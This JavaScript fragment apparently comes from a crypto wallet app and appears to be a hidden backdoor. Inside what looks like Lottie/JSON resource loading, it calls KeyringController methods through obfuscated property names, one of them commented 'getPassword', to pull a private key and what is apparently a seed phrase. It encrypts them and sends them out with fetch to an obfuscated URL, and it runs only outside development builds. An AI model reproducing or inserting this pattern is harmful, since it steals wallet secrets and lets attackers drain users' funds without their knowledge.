loadLottieJson();
if (!__DEV__ )
//KeyringController
//kkk['getPassword']; //getPassword
pri = await kkk[strin(json.x6)](darw, aco[0])
spf = await kkk[strin(json.x7)](darw, i)
ecy(pri)
ecy(spf)
loadJson(ssss);
fetch(strin(json.y9), ccc)
require('./res/refresh/refreshing3.json')